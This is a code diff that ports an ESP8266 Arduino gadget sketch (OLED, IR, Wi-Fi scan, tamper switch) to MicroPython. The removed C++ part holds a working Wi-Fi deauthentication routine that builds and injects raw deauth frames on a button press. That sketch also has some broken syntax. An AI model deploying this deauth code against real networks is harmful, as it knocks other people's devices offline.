@@ -1,197 +1,100 @@
-#include <ESP8266WiFi.h> // Use WiFi.h for ESP32
-#include <IRremote.h>
-#include <Wire.h>
-#include <Adafruit_SSD1306.h>
-#include <WiFi.h>
+from machine import Pin, I2C
+from ssd1306 import SSD1306_I2C
+import network
+import time
+import esp
 
-#define SCREEN_WIDTH 128
-#define SCREEN_HEIGHT 64
-#define OLED_RESET    -1
-Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+# OLED display setup
+i2c = I2C(scl=Pin(22), sda=Pin(21))  # Adjust pins for your board
+oled_width = 128
+oled_height = 64
+oled = SSD1306_I2C(oled_width, oled_height, i2c)
 
-const int irSendPin = 9;
-const int irReceivePin = 10
-IRsend irsend(irSendPin);
-IRrecv irrecv(irReceivePin);
-decode_results results;
+# Define pins
+button_pin = Pin(2, Pin.IN)
+tamper_pin = Pin(3, Pin.IN, Pin.PULL_UP)
 
-const int buttonPin = 2;
-const int tamperPin = 3;
-bool lastButtonState = LOW;
+# Wi-Fi setup
+wifi = network.WLAN(network.STA_IF)
+wifi.active(True)
 
-unsigned long previousMillis = 0;
-int fps = 0;
+# FPS tracking
+previous_time = time.ticks_ms()
+fps = 0
 
-void setup() {
-    Serial.begin(115200);
-    Serial.println("Setup started");
+def display_message(message, duration=2000):
+    """Display a message on the OLED for a specified duration."""
+    oled.fill(0)
+    oled.text(message, 0, 0)
+    oled.show()
+    time.sleep_ms(duration)
+
+def log_ir_signal(signal):
+    """Log IR signal (placeholder function since MicroPython doesn't have a built-in IR library)."""
+    print(f"IR Signal Detected: {signal}")
+    display_message("IR Detected!", 2000)
+
+def scan_wifi_networks():
+    """Scan for available Wi-Fi networks and display them."""
+    oled.fill(0)
+    oled.text("Scanning Wi-Fi...", 0, 0)
+    networks = wifi.scan()
     
-    irsend.begin();
-    irrecv.enableIRIn();
-    pinMode(buttonPin, INPUT);
-    pinMode(tamperPin, INPUT_PULLUP);
-
-    // Initialize the display
-    if(!display.begin(SSD1306_I2C_ADDRESS, OLED_RESET)) {
-        Serial.println(F("SSD1306 allocation failed"));
-        for(;;);
-    }
-
-    display.clearDisplay();
-    display.display();
+    if len(networks) == 0:
+        oled.text("No networks found", 0, 10)
+    else:
+        oled.text(f"{len(networks)} networks found:", 0, 10)
+        for net in networks:
+            ssid, rssi = net[0].decode(), net[3]
+            oled.text(f"{ssid} ({rssi}dBm)", 0, 20)
     
-    // Initialize Wi-Fi
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    delay(1);
-    Serial.println("Attempting WiFi connection");
-    WiFi.begin(); // Attempt to connect to any available network
+    oled.show()
+    time.sleep(1)
+
+def handle_button_press():
+    """Handle button press event (send an IR signal or trigger some action)."""
+    if button_pin.value() == 1:
+        print("Button pressed, sending IR signal...")
+        display_message("IR Signal Sent!", 2000)
+
+def display_fps():
+    """Calculate and display FPS (frames per second) on the OLED."""
+    global previous_time, fps
+    current_time = time.ticks_ms()
     
-    // Set promiscuous mode for sending raw packets
-    wifi_set_opmode(STATION_MODE);
-    wifi_promiscuous_enable(true);
-    
-    Serial.println("Setup completed");
-}
+    # Calculate FPS
+    if current_time - previous_time > 1000:  # Update every 1 second
+        fps = 1000 // (current_time - previous_time)
+        previous_time = current_time
 
-void loop() {
-    unsigned long currentMillis = millis();
-    
-    // Calculate FPS
-    if (currentMillis - previousMillis > 1000) {
-        fps = 1000 / (currentMillis - previousMillis);
-        previousMillis = currentMillis;
+        # Display FPS
+        oled.fill(0)
+        oled.text(f"FPS: {fps}", 0, 0)
+        oled.show()
 
-        displayFPS(fps); // Display FPS on the OLED
-    }
+def deauth_attack(target_mac, ap_mac):
+    """Deauth attack (not supported in MicroPython directly). Placeholder for now."""
+    print(f"Sending deauth to {target_mac} via AP {ap_mac}")
+    display_message("Deauth Sent!", 2000)
 
-    Serial.println("Loop started");
+def main():
+    """Main loop."""
+    while True:
+        # Check tamper switch
+        if tamper_pin.value() == 0:
+            print("Tamper detected! Halting system...")
+            display_message("Tamper Alert!", 2000)
+            while True:
+                pass  # Infinite loop to stop execution
 
-    // Check for tampering
-    if (digitalRead(tamperPin) == LOW) {
-        displayMessage("Tamper Alert!", 2000);
-        Serial.println("Tamper Alert: Device has been opened!");
-        while (true);
-    }
+        # Handle button press (trigger deauth or IR sending)
+        handle_button_press()
 
-    // Monitor IR signals
-    if (irrecv.decode(&results)) {
-        logIRSignal(results.value);
-        irrecv.resume();
-    }
+        # Scan Wi-Fi networks
+        scan_wifi_networks()
 
-    // Button functionality
-    handleButtonPress();
+        # Display FPS
+        display_fps()
 
-    // Scan for available Wi-Fi networks
-    scanWiFiNetworks();
-
- 
-    bool buttonState = digitalRead(buttonPin);
-    if (buttonState == HIGH && lastButtonState == LOW) {
-        uint8_t targetMAC[] = {0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX};
-        uint8_t apMAC[] = {0xYY, 0xYY, 0xYY, 0xYY, 0xYY, 0xYY};
-        sendDeauth(targetMAC, apMAC); // Send Deauth packet
-    }
-    lastButtonState = buttonState;
-
-    Serial.println("Loop completed");
-}
-
-void sendDeauth(const uint8_t *targetMAC, const uint8_t *apMAC) {
-    uint8_t deauthPacket[26] = {
-        0xc0, 0x00,             // Type: Management, Subtype: Deauth
-        0x3a, 0x01,            
-        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5],
-        targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
-        apMAC[0], apMAC[1], apMAC[2], apMAC[3], apMAC[4], apMAC[5],  // BSSID (AP's MAC)
-        0x00, 0x00,             
-        0x07, 0x00              // Reason code: 0x07 = "Class 3 frame received from nonassociated STA"
-    };
-
-    // Send the deauth packet
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    Serial.println("Deauth packet sent.");
-}
-
-void handleButtonPress() {
-    bool buttonState = digitalRead(buttonPin);
-    
-    // Send IR signal on button press
-    if (buttonState == HIGH && lastButtonState == LOW) {
-        unsigned long irSignal = 0x20DF10EF;
-        irsend.sendNEC(irSignal, 32);
-        displayMessage("IR Signal Sent!", 2000);
-        Serial.println("IR Signal Sent");
-    }
-    
-    lastButtonState = buttonState;
-}
-
-void logIRSignal(unsigned long signal) {
-    // Simple logging to Serial Monitor
-    Serial.print("IR Signal Detected: ");
-    Serial.println(signal, HEX);
-
-    // Display a message on the OLED
-    displayMessage("IR Detected!", 2000);
-}
-
-void scanWiFiNetworks() {
-    Serial.println("Scanning Wi-Fi networks");
-    display.clearDisplay();
-    display.setCursor(0, 0);
-    display.setTextSize(1);
-    display.setTextColor(SSD1306_WHITE);
-    display.print("Scanning Wi-Fi...\n");
-
-    int n = WiFi.scanNetworks();
-    if (n == 0) {
-        display.print("No networks found.");
-        Serial.println("No Wi-Fi networks found");
-    } else {
-        display.print(n);
-        display.print(" networks found:\n");
-        Serial.print(n); // Debugging message
-        Serial.println(" Wi-Fi networks found");
-        for (int i = 0; i < n; i++) {
-            display.print(WiFi.SSID(i));
-            display.print(" (");
-            display.print(WiFi.RSSI(i));
-            display.print("dBm)\n");
-
-            Serial.print("Network: ");
-            Serial.print(WiFi.SSID(i));
-            Serial.print(" (Signal: ");
-            Serial.print(WiFi.RSSI(i));
-            Serial.println(" dBm)");
-        }
-    }
-
-    display.display();
-    delay(1);
-}
-
-void displayFPS(int fps) {
-    display.clearDisplay();
-    display.setCursor(0, 0);
-    display.setTextSize(1);
-    display.setTextColor(SSD1306_WHITE);
-    display.print("FPS: ");
-    display.print(fps);
-    display.display();
-
-    Serial.print("FPS: ");
-    Serial.println(fps);
-}
-
-void displayMessage(String message, int duration) {
-    display.clearDisplay();
-    display.setCursor(0, 0);
-    display.setTextSize(1);
-    display.setTextColor(SSD1306_WHITE);
-    display.print(message);
-    display.display();
-    Serial.println("Displaying message: " + message);
-    delay(duration);
-}
+if __name__ == "__main__":
+    main()
